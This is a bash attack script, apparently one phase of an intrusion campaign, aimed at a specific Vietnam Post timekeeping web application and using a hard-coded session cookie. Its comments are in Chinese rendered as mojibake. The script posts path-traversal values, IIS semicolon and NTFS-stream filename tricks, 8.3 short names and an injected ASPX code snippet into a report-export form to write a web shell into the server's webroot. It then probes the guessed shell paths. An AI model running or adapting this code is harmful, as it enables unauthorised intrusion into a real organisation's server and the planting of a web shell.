#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"
ID="BC01"

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ Phase 5: é«˜çº§åˆ©ç”¨ + æ–‡ä»¶è§£æç»•è¿‡"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

mkdir -p phase5_advanced && cd phase5_advanced

get_viewstate() {
    local id=$1
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo "[1] IISæ–‡ä»¶è§£ææ¼æ´æµ‹è¯•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "IIS 6.0: /shell.asp;.xls â†’ å½“ä½œ.aspæ‰§è¡Œ"
echo "IIS 7.0+: /shell.asp:.xls â†’ NTFSæµ"
echo ""

IIS_PAYLOADS=(
    "../../../inetpub/wwwroot/chamcong/test.asp;|.jpg"        # IIS 6.0åˆ†å·
    "../../../inetpub/wwwroot/chamcong/test.asp::|.jpg"       # NTFSæµ
    "../../../inetpub/wwwroot/chamcong/test.aspx;|.jpg"       # IIS 6.0åˆ†å·
    "../../../inetpub/wwwroot/chamcong/test.aspx::|.jpg"      # NTFSæµ
    "../../../inetpub/wwwroot/chamcong/test.asp/|a.jpg"       # æ–‡ä»¶å¤¹trick
    "../../../inetpub/wwwroot/chamcong/test.aspx/|a.jpg"      # æ–‡ä»¶å¤¹trick
)

get_viewstate "$ID"

for i in "${!IIS_PAYLOADS[@]}"; do
    IFS='|' read thang nam <<< "${IIS_PAYLOADS[$i]}"
    echo ""
    echo "  [$((i+1))/${#IIS_PAYLOADS[@]}] $thang | $nam"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnExport=Export" \
        -o "iis_${i}.html" 2>&1
    
    path=$(grep -oE "Could not find a part of the path '[^']+'" "iis_${i}.html" | cut -d"'" -f2)
    [ -n "$path" ] && echo "    è·¯å¾„: $path"
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[2] å°è¯•å†™å…¥åˆ°ç°æœ‰ç›®å½•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å·²çŸ¥å­˜åœ¨çš„ç›®å½•: /chamcong/, /chamcong/report/"
echo ""

EXISTING_DIRS=(
    "../../../inetpub/wwwroot/chamcong/report/x|.aspx"
    "../../../inetpub/wwwroot/chamcong/x|.aspx"
    "../../../inetpub/wwwroot/x|.aspx"
    "../../../../wwwroot/chamcong/x|.aspx"
    "../../../../wwwroot/x|.aspx"
)

get_viewstate "$ID"

for i in "${!EXISTING_DIRS[@]}"; do
    IFS='|' read thang nam <<< "${EXISTING_DIRS[$i]}"
    echo ""
    echo "  [$((i+1))/${#EXISTING_DIRS[@]}] $thang | $nam"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnExport=Export" \
        -o "exist_${i}.html" 2>&1
    
    size=$(wc -c < "exist_${i}.html")
    path=$(grep -oE "Could not find a part of the path '[^']+'" "exist_${i}.html" | cut -d"'" -f2)
    
    if [ -n "$path" ]; then
        echo "    è·¯å¾„: $path"
    else
        echo "    å¤§å°: $size bytes"
        if grep -qi "success\|complete\|exported" "exist_${i}.html"; then
            echo "    ğŸ”¥ğŸ”¥ğŸ”¥ å¯èƒ½å†™å…¥æˆåŠŸï¼ï¼ˆæ— é”™è¯¯ä¿¡æ¯ï¼‰"
        fi
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[3] çŸ­æ–‡ä»¶å (8.3æ ¼å¼)"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "WindowsçŸ­æ–‡ä»¶å: SHELL~1.ASP"
echo ""

SHORT_NAMES=(
    "../../../inetpub/wwwroot/chamcong/shell~1|.asp"
    "../../../inetpub/wwwroot/chamcong/x~1|.asp"
    "../../../inetpub/wwwroot/chamcong/test~1|.aspx"
)

get_viewstate "$ID"

for i in "${!SHORT_NAMES[@]}"; do
    IFS='|' read thang nam <<< "${SHORT_NAMES[$i]}"
    echo ""
    echo "  [$((i+1))/${#SHORT_NAMES[@]}] $thang | $nam"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnExport=Export" \
        -o "short_${i}.html" 2>&1
    
    path=$(grep -oE "Could not find a part of the path '[^']+'" "short_${i}.html" | cut -d"'" -f2)
    [ -n "$path" ] && echo "    è·¯å¾„: $path"
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[4] æµ‹è¯•æ‰€æœ‰å…¶ä»–å‚æ•°ç»„åˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "å°è¯•æ§åˆ¶æ–‡ä»¶å†…å®¹ï¼šé€šè¿‡æŠ¥è¡¨æ•°æ®"
echo ""

# å…ˆè·å–ä¸€ä¸ªæœ‰æ•ˆçš„Exportè¯·æ±‚çš„å®Œæ•´ViewState
get_viewstate "$ID"

# æµ‹è¯•æ˜¯å¦å¯ä»¥é€šè¿‡å…¶ä»–å‚æ•°å½±å“æ–‡ä»¶å†…å®¹
echo "  æµ‹è¯•å¸¦æœ‰ç‰¹æ®ŠListDV/ListBPå‚æ•°..."
curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/test" \
    --data-urlencode "txtNam=.aspx" \
    --data-urlencode "ListDV=<%@ Page Language=\"C#\" %><% Response.Write(\"test\"); %>" \
    --data-urlencode "btnExport=Export" \
    -o "param_test.html" 2>&1

path=$(grep -oE "Could not find a part of the path '[^']+'" "param_test.html" | cut -d"'" -f2)
if [ -n "$path" ]; then
    echo "    è·¯å¾„: $path"
else
    echo "    å¤§å°: $(wc -c < param_test.html) bytes"
fi

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[5] æµ‹è¯•ä¸åŒçš„BCæŠ¥è¡¨ï¼ˆå¯èƒ½æƒé™ä¸åŒï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

for bc_id in "BC01" "BC02" "BC03"; do
    echo ""
    echo "  æµ‹è¯• $bc_id + è·¯å¾„éå†..."
    
    get_viewstate "$bc_id"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${bc_id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=../../../inetpub/wwwroot/shell" \
        --data-urlencode "txtNam=.aspx" \
        --data-urlencode "btnExport=Export" \
        -o "bc_${bc_id}_test.html" 2>&1
    
    path=$(grep -oE "Could not find a part of the path '[^']+'" "bc_${bc_id}_test.html" | cut -d"'" -f2)
    if [ -n "$path" ]; then
        echo "    è·¯å¾„: $path"
        
        # æ£€æŸ¥æ˜¯å¦æœ‰æƒé™é”™è¯¯
        if grep -qi "access.*denied\|permission" "bc_${bc_id}_test.html"; then
            echo "    âš ï¸  æƒé™æ‹’ç»"
        fi
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[6] ç»ˆææµ‹è¯•ï¼šå°è¯•è®¿é—®å·²å†™å…¥çš„æ–‡ä»¶"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

# åŸºäºä¹‹å‰çš„æˆåŠŸè·¯å¾„ï¼Œæµ‹è¯•æ–‡ä»¶æ˜¯å¦çœŸçš„è¢«å†™å…¥
POSSIBLE_PATHS=(
    "/chamcong/shell.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls"
    "/chamcong/shell2025_BC01_KVMB_KVMBTCVP  _BC_DT.xls"
    "/chamcong/x.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls"
    "/shell.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls"
    "/chamcong/report/x.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls"
)

for path in "${POSSIBLE_PATHS[@]}"; do
    echo -n "  æµ‹è¯•: $path: "
    resp=$(curl -sk "http://vps.vnpost.vn${path}" -H "Cookie: $COOKIE" -w "%{http_code}" -o "test_access_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1)
    http_code=$(echo "$resp" | tail -1)
    size=$(wc -c < "test_access_$(echo $path | md5sum | cut -d' ' -f1).html")
    
    echo "$http_code ($size bytes)"
    
    if [ "$http_code" == "200" ] && [ $size -gt 0 ]; then
        echo "    ğŸ”¥ğŸ”¥ğŸ”¥ æ–‡ä»¶å­˜åœ¨ï¼"
        head -20 "test_access_$(echo $path | md5sum | cut -d' ' -f1).html"
    fi
done

echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… Phase 5 å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“Š å…³é”®æµ‹è¯•:"
echo "  - IISè§£ææ¼æ´"
echo "  - ç°æœ‰ç›®å½•å†™å…¥"
echo "  - çŸ­æ–‡ä»¶å"
echo "  - ä¸åŒBCæŠ¥è¡¨"
echo "  - æ–‡ä»¶è®¿é—®éªŒè¯"
